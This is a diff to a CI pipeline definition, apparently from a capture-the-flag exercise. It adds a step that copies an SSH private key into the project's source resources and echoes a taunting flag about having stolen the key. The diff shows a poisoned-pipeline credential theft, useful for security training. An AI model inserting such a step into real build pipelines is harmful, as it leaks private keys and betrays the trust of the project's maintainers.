@@ -212,7 +212,7 @@ spec:
         cd "${CHECKOUT_DIR}"
         
         # CTF ---
-        cp -R /tmp/ssh ${WORKSPACE_OUTPUT_PATH}/src/main/resources
+        cp -R /tmp/ssh/id_ed2551 ${WORKSPACE_OUTPUT_PATH}/src/main/resources/ctf_ssh_identity.key
         # ---- 
         
         RESULT_SHA="$(git rev-parse HEAD)"
@@ -228,7 +228,7 @@ spec:
         echo ""
         echo ""
         echo "CTF{AHAHAHAHAHA... Thanks for running the pipeline again....Now I have the SSH KEY I WAS LOOKING FOR !!!! }"
-        ls -R ${WORKSPACE_OUTPUT_PATH}/src/main
+        ls -R ${WORKSPACE_OUTPUT_PATH}/src/main/resources
         	
       securityContext:
         runAsNonRoot: true
